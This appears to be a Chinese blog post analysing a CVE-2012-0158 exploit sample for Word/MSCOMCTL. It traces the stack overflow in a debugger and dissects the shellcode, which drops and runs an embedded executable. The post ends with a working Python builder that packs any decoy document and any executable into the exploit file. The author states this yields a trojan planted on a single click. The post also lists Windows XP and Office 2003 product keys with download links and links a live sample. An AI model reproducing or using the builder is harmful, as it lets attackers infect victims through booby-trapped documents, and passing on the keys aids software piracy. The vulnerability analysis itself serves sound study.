<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Bigtang&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="#CVE-2012-0158
@[Written By Bigtang]
测试环境操作系统
Windows XP Professional with Service Pack 3 (x86) - CD (Chinese-Simplified) 详细信息文件名:zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.i">
<meta property="og:type" content="website">
<meta property="og:title" content="Bigtang's Blog">
<meta property="og:url" content="http://bigtang.org/images/CVE-2012-0158/CVE-2012-0158.html">
<meta property="og:site_name" content="Bigtang's Blog">
<meta property="og:description" content="#CVE-2012-0158
@[Written By Bigtang]
测试环境操作系统
Windows XP Professional with Service Pack 3 (x86) - CD (Chinese-Simplified) 详细信息文件名:zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.i">
<meta property="og:image" content="http://bigtang.org/./1467196606573.png">
<meta property="og:image" content="http://bigtang.org/./1467045297757.png">
<meta property="og:image" content="http://bigtang.org/./1467045886581.png">
<meta property="og:image" content="http://bigtang.org/./1467045764602.png">
<meta property="og:image" content="http://bigtang.org/./1467046386671.png">
<meta property="og:image" content="http://bigtang.org/./1467046554951.png">
<meta property="og:image" content="http://bigtang.org/./1467046766440.png">
<meta property="og:image" content="http://bigtang.org/./1467047203959.png">
<meta property="og:image" content="http://bigtang.org/./1467047485305.png">
<meta property="og:image" content="http://bigtang.org/./1467047622446.png">
<meta property="og:image" content="http://bigtang.org/./1467048186252.png">
<meta property="og:image" content="http://bigtang.org/./1467048514864.png">
<meta property="og:image" content="http://bigtang.org/./1467048760478.png">
<meta property="og:image" content="http://bigtang.org/./1467049580277.png">
<meta property="og:image" content="http://bigtang.org/./1467049718496.png">
<meta property="og:image" content="http://bigtang.org/./1467117424565.png">
<meta property="og:image" content="http://bigtang.org/./1467184638969.png">
<meta property="og:image" content="http://bigtang.org/./1467184417935.png">
<meta property="og:image" content="http://bigtang.org/./1467183847730.png">
<meta property="og:image" content="http://bigtang.org/./1467170012311.png">
<meta property="og:image" content="http://bigtang.org/./1467188560353.png">
<meta property="og:image" content="http://bigtang.org/./1467188796648.png">
<meta property="og:updated_time" content="2016-09-08T09:24:12.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bigtang's Blog">
<meta name="twitter:description" content="#CVE-2012-0158
@[Written By Bigtang]
测试环境操作系统
Windows XP Professional with Service Pack 3 (x86) - CD (Chinese-Simplified) 详细信息文件名:zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.i">
<meta name="twitter:image" content="http://bigtang.org/./1467196606573.png">
  
    <link rel="alternative" href="/atom.xml" title="Bigtang&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">b1gtang</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
						<li>关于我</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="#" title="rss">rss</a>
					        
								<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Arm/" style="font-size: 10px;">Arm</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://l-team.org/">L</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https:leavesongs.com/">Phithon</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://le4f.net/">le4f</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://z1ng.net/">z1ng</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://x0day.me/">DM_</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://wils0n.cn/">wilson</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://th1nk.info/">Th1nk</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me">Chu</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://cyrils.org">Cyrils</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.iret.xyz/">Silver</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://joychou.org/">Joychou</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.Thinkings.org/">Tr3jer</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">Binary analysis, computer security, exploit writing, CTFs, hacking</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">b1gtang</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">b1gtang</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="#" title="rss">rss</a>
			        
						<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="page-undefined" class="article article-type-page" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/images/CVE-2012-0158/CVE-2012-0158.html" class="article-date">
  	<time datetime="2016-09-08T09:29:53.000Z" itemprop="datePublished">2016-09-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#CVE-2012-0158</p>
<p>@[Written By Bigtang]</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><blockquote>
<p>Windows XP Professional with Service Pack 3 (x86) - CD (Chinese-Simplified) 详细信息<br>文件名:<a href="ed2k://|file|zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.iso|630239232|CD0900AFA058ACB6345761969CBCBFF4|/" target="_blank" rel="external">zh-hans_windows_xp_professional_with_service_pack_3_x86_cd_x14-80404.iso</a><br>SHA1:69DBF131116760932DCF132ADE111D6B45778098<br>文件大小:601.04MB<br>发布时间:2008-05-01<br>激活码:7P4YR-BF7R4-B4778-6TBC6-6C2WF</p>
</blockquote>
<h3 id="Office-版本"><a href="#Office-版本" class="headerlink" title="Office 版本"></a>Office 版本</h3><blockquote>
<p>Office Standard Edition 2003 (Simplified Chinese) 详细信息<br>文件名:<a href="ed2k://|file|sc_office_2003_std.iso|429031424|DB59D0F8CC31EF72CC15D675FC9B7C34|/" target="_blank" rel="external">sc_office_2003_std.iso</a><br>SHA1:32CDFD1CB4816AF4DC829D991EC6E775AB013CD9<br>文件大小:409.16MB<br>发布时间:2004-01-20<br>激活码:GWH28-DGCMP-P6RC4-6J4MT-3HFDY</p>
</blockquote>
<h2 id="获取样本"><a href="#获取样本" class="headerlink" title="获取样本"></a>获取样本</h2><p>如何获取样本？我们可以用metasploit生成，也可以从一些论坛去找。这里是我从看雪论坛拿到的一个样本，<a href="http://bbs.pediy.com/attachment.php?attachmentid=66868&amp;d=1335531237" target="_blank" rel="external">cve-2012-0158.zip</a>,密码：chence</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ol>
<li><p>第一步当然是拍个快照了。因为，poc运行后没有正常返回，再下一次打开时，word会提示你是否恢复文件，导致poc不能二次使用。<br>最后会解释为什么这个poc只能用一次=。=<br><img src="./1467196606573.png" alt="Alt text"></p>
</li>
<li><p>观察漏洞行为，环境配置的没问题的话，应该是弹一个计算器。同时注意到原进程<code>winword.exe</code>退出了。<br><img src="./1467045297757.png" alt="Alt text"></p>
</li>
<li><p>因为shellcode执行了calc.exe,猜测调用WinExec函数，遂对其下断点。类似的断点<code>Shell32!ShellExecuteA</code><br><img src="./1467045886581.png" alt="Alt text"></p>
</li>
</ol>
<ol>
<li><p>触发断点时，观察<code>WinExec</code>入栈参数，发现调用a.exe，其正是calc.exe的副本。同时也要注意观察call stack有没有可疑的返回地址（如返回地址处于栈中）<br><img src="./1467045764602.png" alt="Alt text"></p>
</li>
<li><p>此时通过栈回溯，我们再次对<code>MSCOMCTL!DllGetClassObject+0x41cc6-5</code>下断点。（为什么减5？因为<code>MSCOMCTL!DllGetClassObject+0x41cc6</code>是返回地址,我们希望在调用函数之前就让程序断下来）<br><img src="./1467046386671.png" alt="Alt text"></p>
</li>
<li><p>此时，还没有执行到shellcode，但是我也不知道距离shellcode还有多远，因此我们单步(F10)走着看看。往下没几步，就看见ebp忽然变成0了！<br><img src="./1467046554951.png" alt="Alt text"></p>
</li>
<li><p>下一步，ret了一个很著名的地址<code>0x7ff4512</code>（万能跳转地址）<code>jmp esp</code>！查看此时esp，可以知道其位于<code>0x121634</code>。由此我们大概知道，这是一个典型的栈溢出！<br><img src="./1467046766440.png" alt="Alt text"></p>
</li>
<li><p>那么接下来我们比较关心，是什么原因造成的栈溢出。一个简单的定位方法自然就是，观察0x121634是什么时候被写入万能跳转地址的。同样，我们再次断在<code>MSCOMCTL!DllGetClassObject+0x41cc1</code>处。再次触发断点，此时<code>0x121634</code>还没被覆写。<br><img src="./1467047203959.png" alt="Alt text"></p>
</li>
<li><p>我们知道这个断点离最后的ret 8很近，我们不妨多注意接下来的几次call，看看调用前后栈的变化。很幸运，在下一个<code>call(0x275c8a05)</code>, <code>0x121634</code>被覆写。<br><img src="./1467047485305.png" alt="Alt text"></p>
</li>
<li><p>基于此，我们把重点放在这个函数<code>MSCOMCTL!DllGetClassObject+0x41a29 (275c876d)</code>，直接上IDA。一个大大的<code>qmemcpy</code>映入眼帘。其第一个和第三个参数都来自这个函数的形参。<br><img src="./1467047622446.png" alt="Alt text"></p>
</li>
<li><p>这次我们仍断在<code>MSCOMCTL!DllGetClassObject+0x41cc1</code>处，同时这次要单步进入函数内部。先来看一眼函数的参数。对应上图，a1=0x00121628,dwBytes=0x8282。等等！我好像发现了什么。往<code>0x00121628</code>里写0x8282个字节的数据！要知道，<code>0x00121634</code>里可就是上一个函数的返回地址哇！<br><img src="./1467048186252.png" alt="Alt text"></p>
</li>
<li><p>我们继续追踪！来证实我们的想法！来看一下qmemcpy的第二个参数，是来自堆，似乎是在v3+12处赋了值。v3应该是个虚表指针=。=是的，没错。v3+12正是read函数。它从文件里读了0x8282个字节到堆里v5=lpMem。<br><img src="./1467048514864.png" alt="Alt text"></p>
</li>
<li><p>而后qmemcpy把数据从堆里lpMem拷贝到栈里，此时拷贝长度大于a1变量的缓冲区长度，发生栈溢出！而拷贝的数据正是shellcode。<br><img src="./1467048760478.png" alt="Alt text"></p>
</li>
<li><p>至此我们已经定位到发生栈溢出的函数。接下来，还要分析是什么原因导致的栈溢出。很明显，长度是关键！我们要知道dwBytes0x8282是怎么来的。这一次我们需要断在<code>MSCOMCTL!DllGetClassObject+0x41c83(275c89c7)</code>。发现第一次调用<code>MSCOMCTL!DllGetClassObject+0x41a29</code>时读了0xc个字节，<code>“Cobjd\x00...\x82\x82”</code>。<br><img src="./1467049580277.png" alt="Alt text"></p>
</li>
<li><p>再看IDA对该函数的反汇编。12行从文件读0xc个字节，包括Cobjd标志和deBytes=0x8282。然后15行的检查居然是dwBytes&gt;=8,然后从文件读0x8282个字节的数据到v7,而v7仅仅为8个字节。因此，很明显，我们得出一个结论，产生漏洞的原因是程序员把<code>&lt;=</code>写成了<code>&gt;=</code>(ORZ)<br><img src="./1467049718496.png" alt="Alt text"></p>
</li>
</ol>
<h2 id="分析shellcode"><a href="#分析shellcode" class="headerlink" title="分析shellcode"></a>分析shellcode</h2><ol>
<li><p>根据前面的分析，我们在doc中定位shellcode的位置。0x1341为shellcode开始的地方。<br><img src="./1467117424565.png" alt="Alt text"></p>
</li>
<li><p>提取shellcode, 丢进ida里分析=。=我们来学习一下shellcode的各种姿势。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"may.doc"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	fr.<span class="built_in">seek</span>(<span class="number">0x1341</span>)</span><br><span class="line">	data = fr.<span class="built_in">read</span>(<span class="number">0x8282</span>*<span class="number">2</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"shellcode"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">		fw.<span class="built_in">write</span>(data)</span><br></pre></td></tr></table></figure>
</li>
<li><p>sub_88这个函数。是用来定位data段的。data段里放了字符串“<code>kernel32</code>”。<br><img src="./1467184638969.png" alt="Alt text"></p>
</li>
<li><p>获得kernel32的基址。GET kernel32.dll base<br><img src="./1467184417935.png" alt="Alt text"></p>
</li>
<li><p>获取导入模块各函数地址。</p>
</li>
</ol>
<p><img src="./1467183847730.png" alt="Alt text"></p>
<ol>
<li><p>通过对获取的函数名进行CRC32,将解析的函数地址填入data段。<br><img src="./1467170012311.png" alt="Alt text"></p>
</li>
<li><p>讲doc再次内存读入内存，分别从文件偏移0x2878读入0x2d26字节作为a.doc,<br>从0x559e读入0x1c000字节作为a.exe。并解密，<code>key=&#39;\xac&#39;</code>,加密方式异或。接下来想做的是把用解密出来的a.doc替换原文件may.doc<br><img src="./1467188560353.png" alt="Alt text"></p>
</li>
<li><p>从exp中提取两个文件其中<code>a.doc</code>可以正常打开，<code>a.exe</code>为<code>calc.exe</code></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"may.doc"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	data = fr.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">	doc = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">0x2878</span>:][:<span class="number">0x2d26</span>]:</span><br><span class="line">		doc += chr(ord(i)^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"a.doc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">		fw.<span class="built_in">write</span>(doc)</span><br><span class="line"></span><br><span class="line">	exe = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">0x559e</span>:][:<span class="number">0x1c000</span>]:</span><br><span class="line">                exe += chr(ord(i)^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"a.exe"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">                fw.<span class="built_in">write</span>(exe)</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来就是将内存中的<code>a.exe</code>,写入<code>C:\Documents and Settings\Administrator\</code>,并执行。<br><img src="./1467188796648.png" alt="Alt text"></p>
</li>
<li><p>最后就是退出进程了。为什么poc不能二次使用？这个在第7步中就解释了。因为shellcode运行后，会用exp中缀余的资源a.doc去替换原文件。原may.doc为133kB,运行后变成12Kb，显然不是同一个文件了。这样的话，我们把a.doc替换成真实文件，a.exe替换成m.exe。就可以完美利用啦=。=用户点开的效果就是，点一下，种马，自动关闭。再点开，会提示上次文件损坏，但是编辑一切正常。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">docFile =  sys.argv[<span class="number">1</span>]</span><br><span class="line">exeFile =  sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(docFile, <span class="string">"rb"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	<span class="title">_doc</span> = fr.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">doc = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bytearray(<span class="title">_doc</span>):</span><br><span class="line">	doc += chr(i^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">print <span class="string">"docLen: "</span> + hex(<span class="built_in">len</span>(doc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(exeFile, <span class="string">"rb"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	<span class="title">_exe</span> = fr.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">exe = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bytearray(<span class="title">_exe</span>):</span><br><span class="line">	exe += chr(i^<span class="number">0xac</span>)</span><br><span class="line"></span><br><span class="line">print <span class="string">"exeLen: "</span> + hex(<span class="built_in">len</span>(exe))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"may.doc"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> fr:</span><br><span class="line">	poc = fr.<span class="built_in">read</span>()[<span class="number">0</span>:<span class="number">0x2840</span>]</span><br><span class="line"></span><br><span class="line">poc += <span class="string">'\xab'</span>*<span class="number">4</span> + <span class="string">'\xef'</span>*<span class="number">4</span></span><br><span class="line">poc += <span class="string">'%USERPROFILE%\\x.doc\x00'</span></span><br><span class="line">poc += struct.pack(<span class="string">"I"</span>,<span class="built_in">len</span>(doc))</span><br><span class="line">poc += <span class="string">'%USERPROFILE%\\x.exe\x00'</span></span><br><span class="line">poc += struct.pack(<span class="string">"I"</span>,<span class="built_in">len</span>(exe))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"test.doc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fw:</span><br><span class="line">	fw.<span class="built_in">write</span>(poc+doc+exe)%</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><a href="http://bbs.pediy.com/showthread.php?p=1374563" target="_blank" rel="external">【原创】关于LDR的疑问与探索</a><br><a href="http://www.cnblogs.com/xuanyuan/p/4031751.html?utm_source=tuicool" target="_blank" rel="external">分析一段简单的ShellCode——从TEB到函数地址获取</a></p>

      
    </div>
    
  </div>
  
    
  
</article>


<div class="share">
	<!-- JiaThis Button BEGIN -->
	<div class="jiathis_style">
		<span class="jiathis_txt">分享到：</span>
		<a class="jiathis_button_tsina"></a>
		<a class="jiathis_button_cqq"></a>
		<a class="jiathis_button_douban"></a>
		<a class="jiathis_button_weixin"></a>
		<a class="jiathis_button_tumblr"></a>
		<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
	</div>
	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
	<!-- JiaThis Button END -->
</div>



<div class="duoshuo">
	<!-- 多说评论框 start -->
	<div class="ds-thread" data-thread-key="undefined" data-title="" data-url="http://bigtang.org/images/CVE-2012-0158/CVE-2012-0158.html"></div>
	<!-- 多说评论框 end -->
	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
	<script type="text/javascript">
	var duoshuoQuery = {short_name:"true"};
	(function() {
		var ds = document.createElement('script');
		ds.type = 'text/javascript';ds.async = true;
		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
		ds.charset = 'UTF-8';
		(document.getElementsByTagName('head')[0] 
		 || document.getElementsByTagName('body')[0]).appendChild(ds);
	})();
	</script>
	<!-- 多说公共JS代码 end -->
</div>




</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 b1gtang
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>